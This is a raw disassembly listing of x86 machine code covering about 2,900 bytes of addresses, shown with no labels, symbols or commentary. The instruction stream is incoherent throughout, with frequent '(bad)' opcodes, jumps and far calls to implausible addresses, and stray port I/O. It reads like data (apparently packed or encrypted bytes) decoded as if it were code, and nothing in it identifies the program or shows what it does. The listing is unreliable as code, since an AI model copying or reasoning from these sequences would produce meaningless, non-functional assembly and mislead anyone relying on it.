  4083b3:	inc    ecx
  4083b4:	ret    
  4083b5:	xor    edi,edi
  4083b7:	in     eax,dx
  4083b8:	inc    edi
  4083b9:	xor    bh,bh
  4083bb:	push   esp
  4083bc:	mov    ds:0xcab6a639,al
  4083c1:	xor    edi,edi
  4083c3:	je     0x40842a
  4083c5:	xor    bh,bh
  4083c7:	mov    dh,0xba
  4083c9:	out    0x53,eax
  4083cb:	scas   al,BYTE PTR es:[edi]
  4083cc:	mov    dl,0x31
  4083ce:	call   FWORD PTR [edx+edi*2]
  4083d1:	cmp    DWORD PTR [edi-0x14ce3d52],esp
  4083d7:	in     eax,0x47
  4083d9:	pop    ebx
  4083da:	push   0xffffffe9
  4083dc:	mov    dl,0xa7
  4083de:	or     BYTE PTR [eax],al
  4083e0:	scas   eax,DWORD PTR es:[edi]
  4083e1:	mov    ds:0xded0ffcf,eax
  4083e6:	mov    ah,0x54
  4083e8:	rcr    dh,1
  4083ea:	(bad)  
  4083eb:	call   0x3f6f8f
  4083f0:	mov    al,ds:0x90ff5c89
  4083f5:	(bad)  
  4083f7:	mov    ebp,0x2bfedf65
	...
  408424:	add    BYTE PTR [eax],al
  408426:	ins    BYTE PTR es:[edi],dx
  408427:	push   esp
  408428:	cmp    BYTE PTR [eax-0x1a],dl
  40842b:	pop    esp
  40842c:	call   0x9d156c
  408431:	mov    DWORD PTR [edx+0x50fffe10],ebx
  408437:	fstp   TBYTE PTR [esp+ebp*1+0xfedf20]
  40843e:	retf   
  40843f:	ds addr16 and al,0xa7
  408443:	popf   
  408444:	add    bh,bh
  408446:	mov    dl,BYTE PTR [eax]
  408448:	(bad)  
  408449:	inc    DWORD PTR [eax-0x2c]
  40844c:	mov    ebx,0xb5ce7bd
  408451:	ror    BYTE PTR [ebx+0x32],0x8c
  408455:	xchg   ebp,eax
  408456:	xchg   edi,ebx
  408458:	(bad)  
  408459:	push   DWORD PTR [ebp-0x1c]
  40845c:	iret   
  40845d:	inc    ebx
  40845e:	lods   al,BYTE PTR ds:[esi]
  40845f:	add    DWORD PTR [ebp+0xc],esi
  408462:	and    bl,dl
  408464:	das    
  408465:	push   DWORD PTR [eax-0x1c]
  408468:	dec    edi
  408469:	call   0x4126e5
  40846e:	in     eax,dx
  40846f:	cmp    cl,BYTE PTR [ebp+eax*4-0x11a79]
  408476:	daa    
  408477:	in     al,0x74
  408479:	or     bh,cl
  40847b:	jno    0x40844c
  40847d:	call   eax
  40847f:	in     al,0x74
  408481:	cld    
  408482:	ds leave 
  408484:	adc    BYTE PTR [eax],cl
  408486:	push   esi
  408487:	call   0x418446
	...
  4084b4:	pop    ecx
  4084b5:	jns    0x4084e6
  4084b7:	leave  
  4084b8:	jl     0x4084f0
  4084ba:	add    edx,DWORD PTR [ebp-0x4b]
  4084bd:	(bad)  
  4084be:	test   ah,al
  4084c0:	push   esi
  4084c1:	test   eax,0xfecbff8b
  4084c6:	xchg   BYTE PTR [eax+0x31],dl
  4084c9:	pop    es
  4084ca:	idiv   esi
  4084cc:	jae    0x408453
  4084ce:	cmp    al,0x41
  4084d0:	ds call 0xbffe:0x423ebe1d
  4084d8:	inc    ecx
  4084d9:	mov    bh,0xa3
  4084db:	add    BYTE PTR [esi],bh
  4084dd:	inc    edx
  4084de:	ret    0x645
  4084e1:	inc    edx
  4084e2:	add    eax,DWORD PTR [eax]
  4084e4:	add    DWORD PTR ds:[ecx-0xc],0x338f1
  4084ec:	push   esp
  4084ed:	inc    edx
  4084ee:	sbb    eax,0x98b6b300
  4084f3:	neg    ecx
  4084f5:	pop    eax
  4084f6:	xor    al,0x6a
  4084f8:	ds mov edi,0xb76ef441
  4084fe:	xor    esp,0x508a40c9
  408504:	mov    ecx,0x2bff8c8e
  408509:	push   cs
  40850a:	fwait
  40850b:	push   esp
  40850c:	call   0x7e4b8852
  408511:	test   DWORD PTR [ecx],eax
  408513:	jmp    0x43c6fb
	...
  408540:	add    BYTE PTR [eax],al
  408542:	mov    ebp,0x89f797ae
  408547:	call   0xc570f94f
  40854c:	dec    eax
  40854d:	in     al,dx
  40854e:	jno    0x4085aa
  408550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408551:	mov    bh,BYTE PTR [ecx]
  408553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408554:	in     al,0x8a
  408556:	add    esi,DWORD PTR [ebx]
  408558:	adc    BYTE PTR [ecx-0x2a],0x8c
  40855c:	cmp    BYTE PTR [ebp+0x3e],al
  40855f:	fisubr WORD PTR [ebx-0x71]
  408562:	dec    ecx
  408563:	das    
  408564:	jle    0x408599
  408566:	push   esi
  408567:	cdq    
  408568:	aaa    
  408569:	add    edi,DWORD PTR [esi]
  40856b:	fs test eax,0x6be0af0f
  408571:	fwait
  408572:	sub    DWORD PTR [edi],ebp
  408574:	pop    esi
  408575:	xor    edi,DWORD PTR [ebx+0x21925cd8]
  40857b:	das    
  40857c:	mov    ecx,0x465f938a
  408581:	sar    ah,1
  408583:	mov    ds:0x191603a8,eax
  408588:	sbb    eax,0x2963018a
  40858d:	jg     0xe9d3f177
  408593:	cs push ds
  408595:	sbb    edi,DWORD PTR [edi]
  408597:	pop    ebx
  408598:	push   es
  408599:	dec    ecx
  40859a:	loope  0x408544
  40859c:	loope  0x408539
  40859e:	sbb    DWORD PTR ds:0xf0bd8a06,0x920c
	...
  4085d0:	leave  
  4085d1:	cs call 0xea01b7e7
  4085d7:	mov    dh,BYTE PTR [ebx]
  4085d9:	arpl   cx,dx
  4085db:	rol    BYTE PTR [ebx+0x349dde2e],1
  4085e1:	shr    eax,0x88
  4085e4:	sub    esp,DWORD PTR [ebx-0x3f]
  4085e7:	fmul   QWORD PTR [ebx-0x347639d2]
  4085ed:	inc    ebx
  4085ee:	mov    dh,0x89
  4085f0:	mov    DWORD PTR [esi],ebp
  4085f2:	add    BYTE PTR [edx+ebp*4+0x26],bh
  4085f6:	jmp    FWORD PTR [esi-0x6ef75739]
  4085fc:	xor    BYTE PTR ds:0xe8b79eff,bl
  408602:	out    dx,eax
  408603:	sahf   
  408604:	mov    bh,0x2e
  408606:	call   0xff6f133c
  40860b:	xchg   BYTE PTR [ecx],dl
  40860d:	xor    ebp,ecx
  40860f:	shl    DWORD PTR [esi+0x3176ff2e],1
  408615:	das    
  408616:	call   0x9c0710
  40861b:	xor    al,bh
  40861d:	bound  eax,QWORD PTR [eax]
  40861f:	mov    ah,0xaa
  408621:	aas    
  408622:	sub    DWORD PTR ds:0x4eff25de,0x99fc9891
  40862c:	(bad)  
  40862d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40862e:	or     al,0x3e
  408630:	stc    
  408631:	sbb    BYTE PTR [eax-0x58],cl
	...
  40865c:	add    BYTE PTR [eax],al
  40865e:	cmp    eax,0x426c5b43
  408663:	pop    ebx
  408664:	or     ebp,DWORD PTR [ecx]
  408666:	not    esi
  408668:	push   edx
  408669:	call   0xad07e1ab
  40866e:	mov    ch,0x5a
  408670:	add    cl,ch
  408672:	cmp    eax,0xc6fd4516
  408677:	push   ebp
  408678:	add    cl,ch
  40867a:	sub    ebx,DWORD PTR [ebx+0x6a]
  40867d:	jmp    0xe9aae1a5
  408682:	xor    BYTE PTR [eax-0x27d6c60c],bl
  408688:	repz (bad) 
  40868a:	mov    dh,0x2d
  40868c:	push   eax
  40868d:	(bad)  
  40868e:	xor    BYTE PTR [ebx],dh
  408690:	call   DWORD PTR [esi+eax*8+0x42]
  408694:	sub    eax,0x59ba00
  408699:	or     edx,edi
  40869b:	pop    ebp
  40869c:	add    eax,0x5861e9
  4086a1:	add    bh,bh
  4086a3:	ret    
  4086a4:	dec    eax
  4086a5:	inc    ecx
  4086a6:	addr16 loop 0x40871d
  4086a9:	or     al,0xcf
  4086ab:	arpl   sp,dx
  4086ad:	dec    eax
  4086af:	imul   ecx,DWORD PTR [ebx-0xb530530],0x4fe2b8f7
  4086b9:	push   edx
  4086ba:	scas   eax,DWORD PTR es:[edi]
  4086bb:	push   ebx
  4086bc:	aam    0xff
  4086be:	enter  0x85b0,0xf0
	...
  4086ea:	add    BYTE PTR [eax],al
  4086ec:	mov    al,0xe3
  4086ee:	(bad)  
  4086ef:	call   0x3f6f57
  4086f4:	or     eax,0xe63b6859
  4086f9:	cdq    
  4086fa:	add    bh,bh
  4086fc:	mov    dl,0xc8
  4086fe:	idiv   bh
  408700:	js     0x4086e5
  408702:	xor    al,0xc3
  408704:	iret   
  408705:	cdq    
  408706:	add    al,ch
  408708:	push   ebx
  408709:	out    0xfe,eax
  40870b:	call   FWORD PTR [esi-0x53]
  40870e:	in     al,0xf7
  408710:	sbb    bl,ah
  408712:	imul   eax,DWORD PTR [eax],0x41516ccf
  408718:	xlat   BYTE PTR ds:[ebx]
  408719:	jecxz  0x4086cf
  40871b:	lock xor bl,ah
  40871e:	(bad)  
  40871f:	call   DWORD PTR [edx-0x28beb7e9]
  408725:	shl    BYTE PTR [ebp-0x772b372d],1
  40872b:	test   DWORD PTR [ebx+0xdfffedc],edi
  408731:	push   edi
  408732:	push   0x96664d
  408737:	(bad)  
  408738:	ds iret 
  40873a:	xchg   ebx,eax
  40873b:	neg    DWORD PTR [ecx+0x7d35871d]
  408741:	push   0x45
  408743:	add    BYTE PTR [esi-0x7e004c56],dl
  408749:	mov    ebx,0xfd71e881
  40874e:	xchg   BYTE PTR [ebx+0x0],al
	...
  408778:	add    BYTE PTR [eax],al
  40877a:	mov    bl,0xde
  40877c:	mov    ?,edi
  40877e:	imul   eax,DWORD PTR [edx+0xf],0x9887bd49
  408785:	neg    DWORD PTR [ecx-0x23]
  408788:	add    esi,DWORD PTR [esi+edi*8-0x40]
  40878c:	dec    ecx
  40878d:	call   0xc834e3
  408792:	retf   0x1aec
  408795:	add    BYTE PTR [esi],bh
  408797:	lods   eax,DWORD PTR ds:[esi]
  408798:	inc    esi
  408799:	jmp    FWORD PTR [ebx-0x50c64d6]
  40879f:	mov    WORD PTR [edi-0x706a1401],es
  4087a5:	call   FWORD PTR [ecx]
  4087a7:	popf   
  4087a8:	adc    DWORD PTR [eax],ecx
  4087aa:	es std 
  4087ac:	mov    bh,0xff
  4087ae:	or     DWORD PTR [ebp+0x51],ebp
  4087b1:	call   0xffc7ecbf
  4087b6:	jae    0x4087f2
  4087b8:	fwait
  4087b9:	cmp    DWORD PTR [ebx],eax
  4087bb:	jne    0x408744
  4087bd:	push   DWORD PTR [ebx-0x1e0070ab]
  4087c3:	inc    esp
  4087c4:	adc    DWORD PTR [eax],ecx
  4087c6:	out    0x18,al
  4087c8:	mov    eax,0x5154d1ff
  4087cd:	in     al,0xd1
  4087cf:	sub    al,0x86
  4087d1:	call   0xffc7da09
  4087d6:	mov    ecx,0xb1f79866
  4087db:	pop    edx
  4087dc:	out    0x9b,al
	...
  408806:	add    BYTE PTR [eax],al
  408808:	cmp    al,0xb
  40880a:	fiadd  WORD PTR [esi-0x713f1a5f]
  408810:	cdq    
  408811:	sub    eax,ecx
  408813:	mov    es,WORD PTR [ecx-0x2c7939d5]
  408819:	sub    dh,BYTE PTR [esi+0x3c2b8186]
  40881f:	cld    
  408820:	popa   
  408821:	cmc    
  408822:	scas   al,BYTE PTR es:[edi]
  408823:	xchg   BYTE PTR [ecx+0x2b],dh
  408826:	pop    esp
  408827:	xchg   ebx,eax
  408828:	jno    0x408855
  40882a:	sahf   
  40882b:	fwait
  40882c:	sbb    BYTE PTR [ebx],0x96
  40882f:	xchg   BYTE PTR [ecx-0x6b],bl
  408832:	xchg   ecx,eax
  408833:	pushf  
  408834:	xchg   edx,eax
  408835:	sub    al,0x86
  408837:	xchg   BYTE PTR [ecx-0x5b],cl
  40883a:	jge    0x4087d7
  40883c:	inc    esp
  40883d:	out    dx,eax
  40883e:	call   0xe15e8f46
  408843:	add    ecx,DWORD PTR [ebx+0x28254d6]
  408849:	sub    bl,dl
  40884b:	add    edx,DWORD PTR [esp+ebx*2+0x33461056]
  408852:	pop    ecx
  408853:	mov    bh,0x11
  408855:	sub    esi,DWORD PTR [eax+0x40]
  408858:	or     dh,BYTE PTR [ebp+edx*4+0x365b7f33]
  40885f:	adc    BYTE PTR [esi+0x33],al
  408862:	lds    eax,FWORD PTR [ebp+0x12912af1]
  408868:	mov    ds,WORD PTR [ecx+ebp*8+0x86]
	...
  408893:	add    BYTE PTR [eax],al
  408895:	add    BYTE PTR [ebx+0x53],ch
  408898:	add    DWORD PTR [esi],ebp
  40889a:	fsubr  DWORD PTR [edx]
  40889c:	push   cs
  40889d:	sbb    ebp,DWORD PTR [ebp-0x36fc5775]
  4088a3:	mov    al,0xf1
  4088a5:	fwait
  4088a6:	je     0x4088d1
  4088a8:	add    dh,dh
  4088aa:	ret    
  4088ab:	mov    bl,0xba
  4088ad:	cdq    
  4088ae:	cli    
  4088af:	pop    edx
  4088b0:	call   FWORD PTR [edx+ebp*4+0x42]
  4088b4:	das    
  4088b5:	fdivr  QWORD PTR [ebx+0x52cb682a]
  4088bb:	pushf  
  4088bc:	add    dh,cl
  4088be:	inc    ecx
  4088bf:	push   ebx
  4088c0:	call   0xff6b49d0
  4088c5:	push   ecx
  4088c6:	xchg   DWORD PTR [ebx-0x4f3d16bf],ecx
  4088cc:	or     cl,al
  4088ce:	popa   
  4088cf:	daa    
  4088d0:	jmp    DWORD PTR [esi-0x61034f3d]
  4088d6:	xor    DWORD PTR [ebx-0x18],edx
  4088d9:	mov    bl,0x96
  4088db:	sub    bh,bh
  4088dd:	mov    al,ds:0x1c005f7c
  4088e2:	(bad)  
  4088e3:	ss push 0xbe3a3de9
  4088e9:	jbe    0x408934
  4088eb:	push   edi
  4088ec:	push   esp
  4088ee:	xor    eax,0xc35c5242
  4088f3:	sub    ecx,ecx
  4088f5:	sub    esp,DWORD PTR [edx]
  4088f7:	sub    dl,BYTE PTR [edx+eiz*2+0x0]
	...
  408923:	add    BYTE PTR [esi+0x3ddd7cdd],dh
  408929:	pop    edx
  40892a:	test   BYTE PTR [ebx],cl
  40892c:	cmp    eax,0x313e005b
  408931:	push   edi
  408932:	call   0xff6a30ec
  408937:	loop   0x408936
  408939:	scas   eax,DWORD PTR es:[edi]
  40893a:	adc    BYTE PTR [ecx-0x16be6c9e],dl
  408940:	mov    edx,0xd0010caf
  408945:	or     al,0xff
  408947:	push   cs
  408948:	push   ebp
  408949:	mov    al,ds:0x5dad000c
  40894e:	push   0x9ca677
  408953:	push   0x416e25
  408958:	mov    al,ds:0x5648c218
  40895d:	pop    edi
  40895e:	call   0xff1f6e7c
  408963:	or     esp,edi
  408965:	pop    ecx
  408966:	push   ds
  408967:	push   eax
  408968:	push   edi
  408969:	loopne 0x4089df
  40896b:	or     al,0x6f
  40896d:	stos   DWORD PTR es:[edi],eax
  40896e:	sar    bh,cl
  408970:	shr    BYTE PTR [ebp+0x50],0xff
  408974:	cmp    ah,BYTE PTR [edi]
  408976:	out    0x91,eax
  408978:	mov    al,ds:0xbbe8fede
  40897d:	out    dx,eax
  40897e:	(bad)  
  40897f:	dec    edi
  408981:	dec    ch
  408983:	push   DWORD PTR [eax+0x680043]
	...
  4089b1:	add    BYTE PTR [eax],ch
  4089b3:	outs   dx,BYTE PTR ds:[esi]
  4089b4:	inc    ecx
  4089b5:	add    BYTE PTR [edi],ch
  4089b7:	fst    QWORD PTR [eax+0x41]
  4089ba:	push   edi
  4089bb:	inc    ebp
  4089bc:	add    al,BYTE PTR [eax]
  4089be:	daa    
  4089bf:	fucom  st(7)
  4089c1:	loope  0x408999
  4089c3:	(bad)  
  4089c5:	or     edx,DWORD PTR [edi+0x58]
  4089c8:	push   ds
  4089c9:	push   eax
  4089ca:	out    0xdf,eax
  4089cc:	je     0x4089da
  4089ce:	jg     0x408a42
  4089d0:	sar    bh,cl
  4089d2:	sub    BYTE PTR [eax+edx*2-0x1],0xca
  4089d7:	and    al,0xe7
  4089d9:	pop    ecx
  4089da:	inc    eax
  4089db:	(bad)  
  4089dd:	call   0x3f78a5
  4089e2:	jg     0x40896b
  4089e4:	into   
  4089e5:	jmp    DWORD PTR [eax]
  4089e7:	inc    edx
  4089e8:	add    BYTE PTR [eax-0x38],ch
  4089eb:	ins    DWORD PTR es:[edi],dx
  4089ec:	inc    ecx
  4089ed:	add    BYTE PTR [esi],bh
  4089ef:	ficomp DWORD PTR [ebp+0x51]
  4089f2:	jg     0x408a26
  4089f4:	test   BYTE PTR ds:0x41eafd,dh
  4089fa:	(bad)  
  4089fb:	mov    dh,BYTE PTR [edx-0x3cc24601]
  408a01:	je     0x408a53
  408a03:	ret    0xff32
  408a06:	xor    ebp,DWORD PTR [esi]
  408a08:	imul   esp,DWORD PTR [ecx],0xffffff8c
  408a0b:	or     DWORD PTR [ebx-0x6ef11b0],eax
  408a11:	pop    es
  408a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a13:	push   edx
  408a14:	cmp    edi,0x0
	...
  408a3f:	add    BYTE PTR [ecx-0x7e3208f6],cl
  408a45:	jmp    0xf1c8f8b5
  408a4a:	sub    BYTE PTR [edx+0x3e],0x9a
  408a4e:	sti    
  408a4f:	push   eax
  408a50:	push   DWORD PTR [ecx]
  408a52:	jmp    0x4089f8
  408a54:	(bad)  
  408a56:	add    al,0x68
  408a58:	cmp    al,0x32
  408a5a:	add    eax,DWORD PTR [eax-0xaabd9a]
  408a60:	dec    ecx
  408a61:	sub    eax,0x42207443
  408a66:	aam    0xfe
  408a68:	mov    bl,0x3e
  408a6a:	imul   ebp,ecx,0xf
  408a6d:	mov    ecx,0xc18e5083
  408a72:	stc    
  408a73:	pop    es
  408a74:	push   ss
  408a75:	mov    al,BYTE PTR [edx+0x3f9a19ff]
  408a7b:	into   
  408a7c:	adc    DWORD PTR [ecx-0x5f07c994],ebx
  408a82:	sub    DWORD PTR [eax+0x69],0xffffffc3
  408a86:	ret    
  408a87:	(bad)  
  408a88:	clc    
  408a89:	out    0xe,al
  408a8b:	call   0xffc3cd96
  408a90:	mov    ds,WORD PTR [ebx-0x47]
  408a93:	sub    BYTE PTR [ebx+0x53],0x11
  408a97:	dec    ebx
  408a98:	fsub   DWORD PTR [edi]
  408a9a:	push   ss
  408a9b:	ins    BYTE PTR es:[edi],dx
  408a9c:	xor    al,0x19
  408a9e:	push   cs
  408a9f:	or     ecx,0xffffffad
  408aa2:	cmc    
  408aa3:	imul   eax,DWORD PTR [eax],0x0
	...
  408ace:	sub    al,0x19
  408ad0:	inc    BYTE PTR [edx+0x3e11c87]
  408ad6:	or     edx,esp
  408ad8:	cld    
  408ad9:	xchg   BYTE PTR [edx+0x1404532e],al
  408adf:	pop    ebp
  408ae0:	fdivp  st(0),st
  408ae2:	inc    ecx
  408ae3:	xor    ebx,DWORD PTR ds:0x6027914f
  408ae9:	enter  0xb285,0xec
  408aed:	add    al,0x3e
  408aef:	pop    ebx
  408af0:	ror    DWORD PTR [ecx],1
  408af2:	mov    BYTE PTR [edi],ah
  408af4:	mov    dh,0x8c
  408af6:	sti    
  408af7:	and    al,BYTE PTR [ecx+0x8]
  408afa:	aas    
  408afb:	pop    ebx
  408afc:	jmp    0x91637683
  408b01:	test   BYTE PTR [edi+0x7e0ee95a],dl
  408b07:	scas   al,BYTE PTR es:[edi]
  408b08:	cmc    
  408b09:	inc    eax
  408b0a:	inc    edx
  408b0b:	pop    edx
  408b0c:	jmp    0x7e965414
  408b11:	clc    
  408b12:	xor    DWORD PTR [edi],esp
  408b14:	cld    
  408b15:	or     esp,DWORD PTR [esi]
  408b17:	aam    0x6e
  408b19:	sub    BYTE PTR [ecx],0x33
  408b1c:	icebp  
  408b1d:	sub    BYTE PTR [ebx+0xbc25123],0x27
  408b24:	push   esi
  408b25:	in     eax,dx
  408b26:	pop    ecx
  408b27:	xor    edi,ecx
  408b29:	push   ebp
  408b2a:	or     DWORD PTR [edi],esp
  408b2c:	cdq    
  408b2d:	or     BYTE PTR [ebx+0xf15153],0x0
	...
  408b5c:	sti    
  408b5d:	add    BYTE PTR es:[esi],dh
  408b60:	jecxz  0x408ba6
  408b62:	call   0xff671f50
  408b67:	bnd jge 0x408b19
  408b6a:	adc    al,0x91
  408b6c:	loopne 0x408af9
  408b6e:	inc    ecx
  408b6f:	jmp    0x38ccca61
  408b74:	mov    esp,0xc6065026
  408b79:	pop    esi
  408b7a:	call   0xff674b2d
  408b7f:	sbb    DWORD PTR [eax+0x33],0xffffffe1
  408b83:	sbb    BYTE PTR [esi+eiz*1+0x4aa6a90b],bh
  408b8a:	push   0x9b6d4a
  408b8f:	cmp    DWORD PTR [edx],esp
  408b91:	mov    eax,0x8bbfced1
  408b96:	(bad)  
  408b97:	cmp    al,0x32
  408b99:	xor    esi,DWORD PTR [eax]
  408b9b:	mov    edi,0xd56a26bf
  408ba0:	in     eax,0x18
  408ba2:	shr    DWORD PTR [esi+0x1dc052bf],1
  408ba8:	inc    esi
  408ba9:	mov    bl,0x63
  408bab:	cmp    BYTE PTR [ebp+0x26],bh
  408bae:	dec    edi
  408baf:	sub    DWORD PTR [ebx+ecx*1-0x1],0x7525728e
  408bb7:	icebp  
  408bb8:	aad    0x4b
  408bba:	(bad)  
  408bbb:	jle    0x408b7c
  408bbd:	mov    al,0x0
  408bbf:	add    DWORD PTR [eax],eax
	...
  408be9:	add    BYTE PTR [esi],ch
  408beb:	mov    eax,DWORD PTR [ecx-0x17]
  408bee:	adc    eax,0x3da850dc
  408bf3:	es xor eax,0x9b0a2a
  408bf9:	inc    ecx
  408bfa:	jmp    0x408c11
  408bfc:	dec    DWORD PTR [esi-0xe]
  408bff:	and    al,0x75
  408c01:	add    BYTE PTR [edi],cl
  408c03:	mov    dl,0xf1
  408c05:	std    
  408c06:	cmp    ah,bl
  408c08:	imul   eax,DWORD PTR [eax],0x415022ff
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	xor    DWORD PTR [ecx-0xa669af],eax
  408c15:	xor    eax,0x401724
  408c1a:	aas    
  408c1b:	jo     0x408bed
  408c1d:	(bad)  
  408c1e:	cmp    BYTE PTR [eax-0x40],bl
  408c21:	je     0x408c04
  408c23:	rol    BYTE PTR [esp+esi*8-0x48],1
  408c27:	sub    al,0xf3
  408c29:	push   DWORD PTR [edx]
  408c2b:	push   edx
  408c2c:	call   0xff1b26e2
  408c31:	inc    DWORD PTR [edx]
  408c33:	mov    ds:0xdaea01e8,eax
  408c38:	(bad)  
  408c39:	push   0xffffffa7
  408c3b:	xor    DWORD PTR [ebx+0x51],ebp
  408c3e:	push   esi
  408c3f:	pop    edi
  408c40:	push   0xff1a26a5
  408c45:	(bad)  
  408c46:	jb     0x408be6
  408c48:	dec    eax
  408c49:	inc    ecx
  408c4a:	addr16 mov cl,0x2
  408c4d:	rol    BYTE PTR [eax],1
	...
  408c77:	add    BYTE PTR [eax+0x42ff4fda],bl
  408c7d:	push   edi
  408c7e:	call   0xff1b4723
  408c83:	push   0x67
  408c85:	xor    DWORD PTR [esi+0x51],esi
  408c88:	push   ss
  408c89:	pop    edi
  408c8a:	push   0xff1a26a5
  408c8f:	(bad)  
  408c90:	repnz lahf 
  408c92:	dec    eax
  408c93:	inc    ecx
  408c94:	daa    
  408c95:	mov    cl,0xe2
  408c97:	iret   
  408c98:	cwde   
  408c99:	fisttp DWORD PTR [edx]
  408c9b:	rol    BYTE PTR [ebx],0x43
  408c9e:	mov    DWORD PTR [ebp+0x73],eax
  408ca1:	(bad)  [esp+esi*8+0x3e]
  408ca5:	(bad)  
  408ca6:	test   BYTE PTR [edi],0x16
  408ca9:	adc    edi,DWORD PTR [esi-0x1]
  408cac:	add    DWORD PTR [esi-0x5d190c0a],ebx
  408cb2:	dec    edi
  408cb3:	push   ecx
  408cb5:	sbb    BYTE PTR [ebx],al
  408cb7:	push   0xffc1c35a
  408cbc:	pop    ecx
  408cbd:	mov    al,0xd2
  408cbf:	inc    eax
  408cc0:	ds retf 0x4
  408cc4:	ds mov dl,0x6b
  408cc7:	mov    dl,0xf9
  408cc9:	push   ebp
  408cca:	adc    BYTE PTR [eax-0x3f],0xa7
  408cce:	or     ebp,eax
  408cd0:	push   cs
  408cd1:	daa    
  408cd2:	jg     0x408cd3
  408cd4:	and    al,0x32
  408cd6:	jmp    0x408d4e
  408cd8:	psllq  mm0,QWORD PTR [edx]
  408cdb:	push   0x0
	...
  408d04:	add    BYTE PTR [eax],al
  408d06:	mov    esp,0x21ffc563
  408d0b:	xor    BYTE PTR [ebx],al
  408d0d:	add    BYTE PTR [esi-0x76306ce6],bh
  408d13:	adc    eax,0x40ac00b
  408d18:	mov    WORD PTR [ebp+0x72],es
  408d1b:	in     eax,0xf8
  408d1d:	repz jno 0x408d87
  408d20:	or     al,0xe8
  408d22:	dec    edi
  408d23:	idiv   DWORD PTR [esi-0x1]
  408d26:	popa   
  408d27:	inc    edi
  408d28:	js     0x408d12
  408d2a:	fcomip st,st(5)
  408d2c:	jle    0x408d2d
  408d2e:	in     al,0x31
  408d30:	jmp    0x408d9d
  408d32:	out    dx,eax
  408d33:	jb     0x408d39
  408d35:	push   0xffc5439b
  408d3a:	mov    eax,ds:0xbe000330
  408d3f:	(bad)  
  408d41:	into   
  408d42:	sub    DWORD PTR [ebp+0x5babfed4],esi
  408d48:	icebp  
  408d49:	imul   edi,DWORD PTR [edi],0x26
  408d4c:	pop    esi
  408d4d:	jg     0x408cf3
  408d4f:	pop    ebx
  408d50:	shl    esi,0x6e
  408d53:	call   0x3a8:0x89daebe9
  408d5a:	pop    cx
  408d5c:	jmp    0xad734b64
  408d61:	dec    esi
  408d62:	jmp    0x6a846f8a
  408d67:	dec    ebp
  408d68:	jo     0x408d33
	...
  408d92:	add    BYTE PTR [eax],al
  408d94:	int    0x23
  408d96:	xchg   esp,eax
  408d97:	ja     0x408d6a
  408d99:	lods   eax,DWORD PTR ds:[esi]
  408d9a:	loope  0x408e07
  408d9c:	cld    
  408d9d:	es push cs
  408d9f:	jg     0x408d62
  408da1:	lods   eax,DWORD PTR ds:[esi]
  408da2:	std    
  408da3:	imul   ecx,DWORD PTR [edi+edx*1-0x2],0x7e
  408da8:	mov    cl,0xad
  408daa:	cmc    
  408dab:	jle    0x408de0
  408dad:	push   ebx
  408dae:	add    DWORD PTR [ecx+0x4ce62377],ecx
  408db4:	jl     0x408e14
  408db6:	jmp    0x41775293
  408dbb:	add    al,0x3e
  408dbd:	xor    al,0x8f
  408dbf:	jle    0x408dcc
  408dc1:	push   edi
  408dc2:	xabort 0x41
  408dc5:	xor    edi,DWORD PTR [esp+esi*2+0x41a02371]
  408dcc:	ss pop ebx
  408dce:	adc    al,0x8b
  408dd0:	push   edx
  408dd1:	fldcw  WORD PTR [edi+esi*4+0x469e2358]
  408dd8:	mov    ebx,0x497e96e2
  408ddd:	pop    edx
  408dde:	jmp    0x2c10cbe6
  408de3:	adc    BYTE PTR [ebp+0x1b],al
  408de6:	cmc    
  408de7:	or     BYTE PTR [esi+0x26e90063],bh
  408ded:	pop    eax
  408dee:	jmp    0x9bc903
  408df3:	pushw  ss
  408df5:	push   edi
  408df6:	call   0x408ef4
	...
  408e1f:	add    BYTE PTR [eax],al
  408e21:	add    BYTE PTR [eax+0x22],ch
  408e24:	jmp    edx
  408e26:	jge    0x408dd0
  408e28:	xadd   DWORD PTR [edx+edx*4-0x578716bf],ebx
  408e30:	or     al,0x51
  408e32:	add    edx,DWORD PTR [edx]
  408e34:	push   DWORD PTR [esi]
  408e36:	push   esp
  408e37:	push   eax
  408e38:	push   0x9bf041
  408e3d:	es (bad) 
  408e3f:	push   esi
  408e40:	call   0xff630f23
  408e45:	pusha  
  408e46:	mov    dh,0xe3
  408e48:	std    
  408e49:	push   cs
  408e4a:	inc    eax
  408e4b:	mov    bl,0x3e
  408e4d:	call   0x64cde98f
  408e52:	jmp    DWORD PTR [eax]
  408e54:	push   esi
  408e56:	mov    WORD PTR [edx],?
  408e58:	mov    bh,0x22
  408e5a:	and    BYTE PTR [edx],ah
  408e5c:	lea    ebp,[esp+edi*8+0x20]
  408e60:	(bad)  
  408e61:	fisubr WORD PTR [edx+0x21]
  408e64:	mov    ch,0x91
  408e66:	or     BYTE PTR [edx],ah
  408e68:	inc    ecx
  408e6a:	adc    eax,0xc4e8ffe9
  408e6f:	fdivr  DWORD PTR [ebx+0x4021f3bf]
  408e75:	out    0xc1,al
  408e77:	es add cl,ch
  408e7a:	cmp    eax,0xd8ab94d0
  408e7f:	and    edi,edi
  408e81:	xchg   esi,eax
  408e82:	cmp    al,0x4b
  408e84:	add    cl,ch
	...
  408eae:	add    BYTE PTR [eax],al
  408eb0:	cmp    eax,0x7c5c65a7
  408eb5:	jbe    0x408f07
  408eb7:	add    BYTE PTR [edi-0x7f],cl
  408eba:	dec    edi
  408ebb:	inc    ecx
  408ebc:	daa    
  408ebd:	mov    dh,0xc6
  408ebf:	mov    dh,0x17
  408ec1:	pop    esi
  408ec2:	or     eax,eax
  408ec4:	sub    bl,BYTE PTR [ecx-0x17]
  408ec7:	mov    cl,0x27
  408ec9:	pop    esi
  408eca:	add    BYTE PTR [ebp-0x16276],cl
  408ed0:	jo     0x408ea4
  408ed2:	inc    ecx
  408ed3:	sub    al,0xc7
  408ed5:	xor    eax,0x5da64fdf
  408eda:	call   0x97f888
  408edf:	or     edx,DWORD PTR [edi]
  408ee1:	sub    al,BYTE PTR [ecx+ebp*8]
  408ee4:	mov    edx,DWORD PTR [edi+0x0]
  408ee7:	add    BYTE PTR [edi-0x18beb842],ch
  408eed:	sahf   
  408eee:	jne    0x408efc
  408ef0:	aas    
  408ef1:	in     eax,0xcd
  408ef3:	push   DWORD PTR [eax]
  408ef5:	rcl    BYTE PTR [edx+eax*8-0x72005fbf],cl
  408efc:	aad    0x71
  408efe:	push   edx
  408eff:	push   eax
